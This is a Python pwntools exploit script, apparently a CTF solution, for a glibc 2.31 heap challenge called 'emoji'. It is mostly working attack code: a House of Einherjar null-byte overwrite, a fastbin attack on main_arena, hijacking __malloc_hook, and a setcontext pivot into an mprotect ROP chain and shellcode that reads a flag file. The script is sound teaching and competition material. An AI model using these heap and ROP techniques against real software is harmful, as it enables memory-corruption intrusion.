"""
Interesting heap challenge. Binary uses calloc, which zeros meory before returning and
doesn't allocate from the tcache. We can allocate any size (mistake from challenge 
author, he was supposed limit some sizes). Can read, but not edit chunks after 
allocation. Maximum 5 allocated at a time. One single allocate will give us a null byte
overwrite. Libc 2.31

I ended up seriously overcomplicating this, which meant I ended finishing a few hours 
after the CTF ended (:/), but I ended up with a pretty interesting primitive.

1. Fill up tcache for 0x70 and 0x80 chunks, so new frees will get put into the fastbin.
2. Leak heap using name function, which doesn't null terminate the string
3. Allocate some chunks (freeing some of them into the fastbin)
4. Use null byte overwrite to zero out prev in use bit, and cause a coalescing back to a
   fake chunk we prepared earlier (House of einherjar). We now have a chunk in the 
   unsorted bin overlapping the other chunks we previously allocated
5. Use overlaping chunks to leak libc, and execute multistaged fastbin attack to create a
   chunk overlapping the main arena
6. Use that chunk to edit the top chunk pointer to somewhere near the area of memory we
   want to control. Caveat is size field has to pass sanity check. If we misalign the 
   top chunk, we can target both __malloc_hook and __free_hook. We choose __malloc_hook
7. "JOP" to setcontext, setcontext to mprotect ropchain, ropchain to shellcode, shellcode
   to flag
"""

from pwn import *

binary_path = "./emoji"

lib_path = "./lib/"

#lib_path = "/home/kali/HeapLAB/.glibc/glibc_2.31/"

#=Boilerplate=================================================================#

elf = context.binary = ELF(binary_path)
libc = ELF(lib_path + "libc.so.6")

gs="""

#contextwatch execute "vis 30"
contextwatch execute "vis 20 0x555555758000"

python
import splitmind
(splitmind.Mind()
    .tell_splitter(show_titles=True)
    .tell_splitter(set_title="gdb")
    .above(of="main", display="expressions", size="75%")
    .left(of="expressions", display="regs", size="35%")
    .above(of="regs", display="disasm")
    .above(of="disasm", display="stack")
).build(nobanner=True)
end

# python
# import splitmind
# (splitmind.Mind()
#     .tell_splitter(show_titles=True)
#     .tell_splitter(set_title="gdb")
#      #.above(of="main", display="expressions", size="75%")
#      #.left(of="expressions", display="disasm", size="35%")
#     .above(of="main", display="stack", size="75%")
#     .left(of="stack", display="regs", size="66%")
#     .right(of="regs", display="disasm")
# ).build(nobanner=True)
# end

# Catch malloc errors before seccomp kills us
catch syscall writev

#break *0x7ffff7f2fc5

continue
"""
def start():
    if args.DEBUG:
        context.log_level = "DEBUG"

    if args.REMOTE:
        # nc emoji.darkarmy.xyz 32769
        return remote("emoji.darkarmy.xyz", 32769)

    if args.GDB:
        context.terminal = ["tmux", "split-window", "-v", "-b", "-p", "80"]
        return gdb.debug(binary_path, gdbscript=gs, env={"LD_LIBRARY_PATH": lib_path})
    else:
        return process(binary_path, env={"LD_LIBRARY_PATH": lib_path})


def breakpoint(io, msg=None):
    if args.GDB:
        if msg is not None:
            print(f"*** BREAKPOINT: {msg} ***")
        else:
            print("*** BREAKPOINT ***")
        io.interactive()


def alloc_note(io, idx, size, data, clean=True):
    io.sendline("1")
    
    io.recvuntil("index: ")
    io.sendline(f"{idx}")
    
    io.recvuntil("size: ")
    io.sendline(f"{size}")

    io.recvuntil("Data: ")
    io.sendline(data)

    if clean:
        io.recvuntil("1).")
        io.clean()

    return idx


def free_note(io, idx):
    io.sendline("2")

    io.recvuntil("index: ")
    io.sendline(f"{idx}")

    io.recvuntil("1).")
    io.clean()


def read_note(io, idx):
    io.sendline("3")

    io.recvuntil("index: ")
    io.clean()

    io.sendline(f"{idx}")

    result = io.recvline()

    io.recvuntil("1).")
    io.clean()

    return result

def enter_name(io, name):
    io.sendline("5")

    io.recvuntil("name:")
    io.clean()

    io.sendline(name)

    result = io.recvline()

    io.recvuntil("1).")
    io.clean()

    return result

def special_alloc_note(io, idx, size, data):
    io.sendline("6")
    
    io.recvuntil("index: ")
    io.sendline(f"{idx}")
    
    io.recvuntil("Size: ")
    io.sendline(f"{size}")

    io.recvuntil("go: ")
    io.sendline(data)

    io.recvuntil("1).")
    io.clean()

    return idx


io = start()

# Fill up tcache
print("FILLING UP TCACHE", end="")
for x in range(7):
    alloc_note(io, 0, 0x68, f"{x}")
    free_note(io, 0)
    print(".", end="")

for x in range(7):
    alloc_note(io, 0, 0x78, f"{x}")
    free_note(io, 0)
    print(".", end="")

print("Done")

A = alloc_note(io, 0, 0x508, "A")

# Leak heap because enter_name doesn't null terminate, when it's read it also displays
# the pointer in the notes array right after it
heap_leak = u64(enter_name(io, "A"*32)[32:-1].ljust(8, b"\0"))
print(f"HEAP LEAK: {hex(heap_leak)}")

# Because of a poor choice of size here (wasn't thinking correctly, lol), the null byte
# overwrite also shrinks the size of this chunk. Easier to write the fake chunk to 
# make it line up than fix the size and re-align everything
B = alloc_note(io, 1, 0x508, flat({
    0x4f8: p64(0x31)
}))

# Chunk used to prevent consolidation with topchunk
alloc_note(io, 2, 0x018, "C")
free_note(io, 2)

# Free A into the unsorted bin
free_note(io, A)

# Create fake chunk to consolidate back into (remainders out of A)
fake_size = 0x511 - 0x30
fake_free_chunk_data = flat({
    0x28: p64(fake_size),
    0x30: p64(heap_leak + 0x40),
    0x38: p64(heap_leak + 0x48),
    0x40: p64(0),
    0x48: p64(0),
    0x58: p64(heap_leak + 0x20)
})
alloc_note(io, 0, 0x88, fake_free_chunk_data)
free_note(io, 0)

# Chunk to read out unsorted bin address after it overlaps
A2 = alloc_note(io, 4, 0x28, "")


# Chunk used to feed `0x81` into the 0x70 fastbin (freed later to avoid consolidation
# with unsorted bin chunk, and to ensure correct fastbin ordering)
A3 = alloc_note(io, 2, 0x68, "")

# Padding
alloc_note(io, 3, 0xd8, "")
free_note(io, 3)

# Chunk used to poison 0x80 fastbin
alloc_note(io, 3, 0x78, "")
free_note(io, 3)

# Chunk used to fix 0x70 fastbin so the consolidation pass when we allocate a largebin
# sized chunk doesn't choke on the `0x81`. Needed if targeting __free_hook, not sure if
# it's necessary now that we're going after __malloc_hook
alloc_note(io, 3, 0x68, "")
free_note(io, A3) # Free the 0x70 chunks in the right order
free_note(io, 3)

# Set fake size, and overwrite the size of B with a null byte, setting up a house of
# einherjar. This also perfectly clears the unsortedbin
A4 = special_alloc_note(io, 2, 0x208, flat({
    0x200: p64(fake_size - 1)
}))
free_note(io, A4)

# Free B, causing it to consolidate backwards to the fake chunk struct we wrote to A
# This creates a chunk in the unsorted bin that overlaps with all of the chunks we 
# allocated previously
free_note(io, B)

# Remainder off a padding chunk to overlap the unsorted bin address with A2
alloc_note(io, 1, 0x58, "")
free_note(io, 1)

# Read unsorted bin address out of A2
unsortedbin_addr = u64(read_note(io, A2)[:-1].ljust(8, b"\0"))
UNSORTED_BIN_OFFSET = 0x1ebbe0
libc.address = unsortedbin_addr - UNSORTED_BIN_OFFSET

print(f"UNSORTED BIN: {hex(unsortedbin_addr)}")
print(f"LIBC: {hex(libc.address)}")

# Chunk to overwrite fd pointer of 0x70 chunk and feed `0x81` into fastbin
alloc_note(io, 1, 0x38, flat({
    0x28: p64(0x71),
    0x30: p64(0x81)
}))
free_note(io, 1) 

# Pull chunks out of unsorted bin, leave a literal `0x81` in the main arena to use as 
# fake size for 0x80 fastbin attack
F = alloc_note(io, 0, 0x68, "")
A3 = alloc_note(io, 1, 0x68, flat({
    0x08: p64(0x941),
    0x10: p64(unsortedbin_addr),
    0x18: p64(unsortedbin_addr)
}))

# Chunk to overwrite fd pointer of 0x81 chunk and feed address overlaping the main arena
# into the 0x80 fastbin
alloc_note(io, 2, 0x158, flat({
    0x058: p64(0x21) + p64(0)*3 + p64(0x21), # Fake chunks so A3 can be freed eventually
    0x138: p64(0x81) + p64(unsortedbin_addr - 0x30)
}))
free_note(io, 2)

# Pop existing 0x80 chunk out of fastbin, keep unsortedbin information intact. Next 0x80
# chunk will overlap the main arena
T = alloc_note(io, 2, 0x78, flat({
    0x18: p64(0x7e1) + p64(unsortedbin_addr)*2 + p64(0)*2
}))

# Offset from the freehook to some weird random value that we can use as a top chunk
# (notice it's not aligned)
# TOP_CHUNK_OFFSET = 0x1198 - 6
# top_chunk = libc.sym.__free_hook - TOP_CHUNK_OFFSET

# Use the same value that the classic fastbin attach does, but moved forward by one byte
# for a larger top chunk size (0x7fxx). Malloc doesn't care that it's unaligned, only
# free() complains about alignment
top_chunk = libc.sym.__malloc_hook - 0x34

# Chunk that overlaps the main arena. We have everything we need to perfectly recreate
# the information lost by calloc, except we change the top chunk pointer
MAC = alloc_note(io, 3, 0x78, flat({
    # Overwrite top pointer
    0x20: p64(top_chunk),
    # Keep unsortedbin intact
    0x28: p64(heap_leak + 0x220), # Last Remainder
    0x30: p64(heap_leak + 0x220), # Unsortedbin fd
    0x38: p64(heap_leak + 0x220), # Unsortedbin bk

    # Keep smallbins intact
    0x40: p64(unsortedbin_addr+0x10)*2 + p64(unsortedbin_addr+0x20)*2 + p64(unsortedbin_addr+0x30)*2 + p64(unsortedbin_addr+0x40)
}, filler=b"\0"))

# Fix 0x70 fastbin list. We do this by freeing both 0x70 chunks we have, and then
# overwriting the fd pointer of one of them, breaking the link to the bad `0x81` value.
free_note(io, A3)
free_note(io, F)
# Chunk that overlaps the freed 0x70 chunk, allowing us to overwrite the fd pointer
alloc_note(io, 0, 0xf8, flat({
    0x58: p64(0x71) + p64(0),
    0xc8: p64(0x21) + p64(0)*3 + p64(0x21), # Set up valid fake chunks for consolidate
}))
free_note(io, 0)

# Get addresses ready all relative to our known heap address
filename_addr = heap_leak + 0x340
shellcode_addr = heap_leak + 0x450
shellcode_page = shellcode_addr & 0xfffffffffffff000

# Mprotect to make page executable, and then jump to shellcode
rop = ROP(libc)
rop.mprotect(shellcode_page, 0x2000, 0x1 | 0x2 | 0x4)
rop.raw(shellcode_addr)

# Open/Read/Write shellcode
shellcode= asm(f"""
    xor rax, rax
    mov al, 0x2
    xor rsi, rsi
    xor rdx, rdx
    mov rdi, {filename_addr}
    syscall
    mov rdi, rax
    xor rax, rax
    mov rsi, {libc.sym.__malloc_hook + 0x100}
    mov rdx, 0x100
    syscall
    mov rax, 0x1
    mov rdi, rax
    syscall
    mov rax, 0x3c
    xor rdi, rdi
    syscall
""")

# Clear out unsorted bin, so next chunk is served from new top chunk, Use tcache size
# chunks so we can free them and they don't go into the unsorted bin. Write the mprotect
# rop chain the setcontext gadget pivots to, and the shellcode the rop chain pivots to
alloc_note(io, 0, 0x368, flat({
    # First 2 quads are overwritten by tcache pointers when chunk is freed
    0x010: "./flag\0",
    0x020: rop.chain(),
    0x120: shellcode
}))
free_note(io, 0)
alloc_note(io, 0, 0x368, "")
free_note(io, 0)

# mov rdx, rax; ... call qword ptr [rax + 0x20];
MOV_RDX_RAX_CALL_RAX_20 = 0x000000000008abd8

# Address of setcontext gadget
SETCONTEXT = libc.sym.setcontext + 61

# RET gadget for stack alignment
RET = 0x00000000000c12f2

# Initial staging payload. When __malloc_hook is called, RAX is set to it's address. We
# use a mov rdx, rax JOP gadget to set RDX to the address of __malloc_hook, and then call
# the setcontext gadget. setcontext sets all registers to values that are relative to 
# RDX, we only care about RSP (for the stack pivot to our rop chain) and the quad after
# it, which ends up being setcontext's return address. Note that this value is pushed
# onto the stack pointed to by the new RSP, so make sure it doesn't overwrite something
# important.
setctx_payload = flat({
    0x00: p64(libc.address + MOV_RDX_RAX_CALL_RAX_20),
    0x20: p64(SETCONTEXT),
    0x30: shellcode,

    # Set context struct values
    0xa0: p64(heap_leak + 0x350), # RSP - address of ROP chain written earlier
    0xa8: p64(libc.address + RET) # Return address - address of RET gadget
                                  # for stack alignment
})
alloc_note(io, 0, 0xf8, flat({
    0x024: setctx_payload # __malloc_hook is at a weird offset because the new top
                          # chunk is misaligned
}))

# Print address of first instruction to be executed, for debugging
start_addr = u64(setctx_payload[:8])
print(f"START: {hex(start_addr)}")

# Call to malloc triggers "JOP" to setcontext gadget, which pivots stack to rop chain,
# which calls mprotect and finally pivots to some shellcode to cat out the flag
alloc_note(io, 1, 0x100, "", clean=False)

# Flag gets written out, along with a bunch of garbage
flag = io.recvall()
print(flag)

# darkCTF{https://www.youtube.com/watch?v=Ct6BUPvE2sM....................ae48aab730214004b1f024d54757fccd}
